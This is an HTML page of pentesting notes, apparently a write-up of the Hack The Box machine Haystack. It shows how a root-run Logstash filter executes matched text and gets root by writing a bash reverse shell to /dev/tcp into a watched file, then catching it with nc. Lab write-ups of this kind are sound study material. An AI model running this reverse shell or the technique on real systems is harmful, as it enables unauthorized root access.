<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>logstash</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># logstash</h1></strong><br />Logstash is part of the ELK stack (refer to the 2 - ports &amp; services - 9200 elasticsearch node for info on ELK).<br /><br /><strong><h2>## Exploit logstash running as root</h2></strong><br />The example below is from <strong>hackthebox Haystack</strong>.<br /><br />In <code>/etc/logstash</code> there&#39;s a <code>conf.d</code> directory, which contains a set of configuration files.<br /><div class="codebox"><div class="codebox">bash-4.2$&nbsp;cd&nbsp;/etc/logstash/conf.d<br />bash-4.2$&nbsp;ls&nbsp;-alh<br />total&nbsp;12K<br />drwxrwxr-x.&nbsp;2&nbsp;root&nbsp;kibana&nbsp;&nbsp;62&nbsp;jun&nbsp;24&nbsp;08:12&nbsp;.<br />drwxr-xr-x.&nbsp;3&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;183&nbsp;jun&nbsp;18&nbsp;22:15&nbsp;..<br />-rw-r-----.&nbsp;1&nbsp;root&nbsp;kibana&nbsp;131&nbsp;jun&nbsp;20&nbsp;10:59&nbsp;filter.conf<br />-rw-r-----.&nbsp;1&nbsp;root&nbsp;kibana&nbsp;186&nbsp;jun&nbsp;24&nbsp;08:12&nbsp;input.conf<br />-rw-r-----.&nbsp;1&nbsp;root&nbsp;kibana&nbsp;109&nbsp;jun&nbsp;24&nbsp;08:12&nbsp;output.conf</div></div><br /><br />There&#39;s 2 interesing files - <code>input.conf</code> and <code>filter.conf</code>.<br /><div class="codebox"><div class="codebox">bash-4.2$&nbsp;cat&nbsp;input.conf<br />input&nbsp;{<br />	file&nbsp;{<br />		path&nbsp;=&gt;&nbsp;&quot;/opt/kibana/logstash_*&quot;<br />		start_position&nbsp;=&gt;&nbsp;&quot;beginning&quot;<br />		sincedb_path&nbsp;=&gt;&nbsp;&quot;/dev/null&quot;<br />		stat_interval&nbsp;=&gt;&nbsp;&quot;10&nbsp;second&quot;<br />		type&nbsp;=&gt;&nbsp;&quot;execute&quot;<br />		mode&nbsp;=&gt;&nbsp;&quot;read&quot;<br />	}<br />}<br />bash-4.2$&nbsp;cat&nbsp;filter.conf<br />filter&nbsp;{<br />	if&nbsp;[type]&nbsp;==&nbsp;&quot;execute&quot;&nbsp;{<br />		grok&nbsp;{<br />			match&nbsp;=&gt;&nbsp;{&nbsp;&quot;message&quot;&nbsp;=&gt;&nbsp;&quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot;&nbsp;}<br />		}<br />	}<br />}</div></div><br /><br />This page explains how these files work - <a href="https://www.elastic.co/guide/en/logstash/current/config-examples.html#_processing_apache_logs">https://www.elastic.co/guide/en/logstash/current/config-examples.html#_processing_apache_logs</a><br /><br />In summary:<br />• <code>input</code> tells <code>filter</code> what files to read<br />• <code>filter</code> contains the patterns to search through the files for<br /><br /><strong><h3>### 1. input.conf and filter.conf</h3></strong><br /><strong>#### input.conf</strong><br />We can see from <code>input.conf</code> that logstash is taking input from all files named <code>/opt/kibana/logstash_&lt;anything&gt;</code> and treating them as type <code>execute</code><br />• <code>path =&gt; &quot;/opt/kibana/logstash_*&quot;</code><br />• <code>type =&gt; &quot;execute&quot;</code><br /><br /><div class="codebox"><div class="codebox">bash-4.2$&nbsp;cat&nbsp;input.conf<br />input&nbsp;{<br />	file&nbsp;{<br />		path&nbsp;=&gt;&nbsp;&quot;/opt/kibana/logstash_*&quot;<br />		start_position&nbsp;=&gt;&nbsp;&quot;beginning&quot;<br />		sincedb_path&nbsp;=&gt;&nbsp;&quot;/dev/null&quot;<br />		stat_interval&nbsp;=&gt;&nbsp;&quot;10&nbsp;second&quot;<br />		type&nbsp;=&gt;&nbsp;&quot;execute&quot;<br />		mode&nbsp;=&gt;&nbsp;&quot;read&quot;<br />	}<br />}</div></div><br /><br /><strong>#### filter.conf</strong><br /><code>filter.conf</code> is reading all files where <code>type == execute</code> and searching those files for a line that reads: <br /><div class="codebox"><div class="codebox">Ejecutar&nbsp;comando:&nbsp;&lt;command&gt;</div></div><br />and executing that command.<br /><br /><div class="codebox"><div class="codebox">bash-4.2$&nbsp;cat&nbsp;filter.conf<br />filter&nbsp;{<br />	if&nbsp;[type]&nbsp;==&nbsp;&quot;execute&quot;&nbsp;{<br />		grok&nbsp;{<br />			match&nbsp;=&gt;&nbsp;{&nbsp;&quot;message&quot;&nbsp;=&gt;&nbsp;&quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot;&nbsp;}<br />		}<br />	}<br />}</div></div><br /><br />Therefore, to get root we need to create a file in <code>/opt/kibana</code> with the syntax <code>Ejecutar comando: &lt;command&gt;</code> with the command we want to execute. Since logstash is running as root, the command we write will run as root.<br /><br /><strong><h3>### 2. Get root</h3></strong><br />To get root, create a reverse shell with <code>bash</code> and echo it into a file in <code>/opt/kibana</code> with the corect syntax.<br /><div class="codebox"><div class="codebox">bash-4.2$&nbsp;ls&nbsp;-alh&nbsp;/opt/kibana<br />total&nbsp;0<br />drwxr-x---.&nbsp;2&nbsp;kibana&nbsp;kibana&nbsp;&nbsp;6&nbsp;jul&nbsp;15&nbsp;07:07&nbsp;.<br />drwxr-xr-x.&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;20&nbsp;jun&nbsp;18&nbsp;21:20&nbsp;..<br />bash-4.2$&nbsp;echo&nbsp;&quot;Ejecutar&nbsp;comando:&nbsp;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.10.14.5/9002&nbsp;0&gt;&amp;1&quot;&nbsp;&gt;&nbsp;/opt/kibana/logstash_pls<br />bash-4.2$&nbsp;ls&nbsp;-alh&nbsp;/opt/kibana<br />total&nbsp;4,0K<br />drwxr-x---.&nbsp;2&nbsp;kibana&nbsp;kibana&nbsp;26&nbsp;jul&nbsp;15&nbsp;07:30&nbsp;.<br />drwxr-xr-x.&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;20&nbsp;jun&nbsp;18&nbsp;21:20&nbsp;..<br />-rw-r--r--.&nbsp;1&nbsp;kibana&nbsp;kibana&nbsp;59&nbsp;jul&nbsp;15&nbsp;07:30&nbsp;logstash_pls<br />bash-4.2$&nbsp;cat&nbsp;/opt/kibana/logstash_pls<br />Ejecutar&nbsp;comando:&nbsp;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.10.14.5/9002&nbsp;0&gt;&amp;1</div></div><br /><br />Start a listener on your attacking machine to receive your shell:<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/haystack#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br />listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...</div></div><br /><br />And wait... For me, it took a few minutes to get a callback. <br />You should receive a shell! Go read <code>/root/root.txt</code>.<br /><div class="codebox"><div class="codebox">...<br />connect&nbsp;to&nbsp;[10.10.14.5]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.115]&nbsp;48334<br />bash:&nbsp;no&nbsp;hay&nbsp;control&nbsp;de&nbsp;trabajos&nbsp;en&nbsp;este&nbsp;shell<br />[root@haystack&nbsp;/]#&nbsp;id<br />id<br />uid=0(root)&nbsp;gid=0(root)&nbsp;grupos=0(root)&nbsp;contexto=system_u:system_r:unconfined_service_t:s0<br />[root@haystack&nbsp;/]#&nbsp;cat&nbsp;/root/root.txt<br />cat&nbsp;/root/root.txt<br />3f5f727...</div></div><br /><br /><strong><h3>### Bonus: Explaining match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }</h3></strong><br /><code>grok</code> is a logstash plugin that parses arbitrary text - <a href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html">https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html</a><br />• <code>\s</code> is regex for whitespace (i.e. a space, a tab etc.)<br />• <code>%{GREEDYDATA:comando}&quot;</code> is how you define a grok pattern<br /><br />The syntax for grok patterns is <code>%{SYNTAX:SEMANTIC}<br /></code>• <code>SYNTAX</code> is the pattern to search your text for - i.e. number/IP address etc.<br />• <code>SEMANTIC</code> is a variable for the data that&#39;s being retrieved - i.e. customerID<br />   ◇ The <code>GREEDYDATA</code> grok pattern is <code>.*</code> - i.e. anything/everything<br />   ◇ <code>comando</code> is the identifier/variable for our command<br /><br />Therefore, <code>Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot;</code> translates plaintext/without the grok syntax as:<br /><div class="codebox"><div class="codebox">Ejecutar&nbsp;comando:&nbsp;&lt;command&gt;</div></div><br /><br /></div>
</body>
</html>
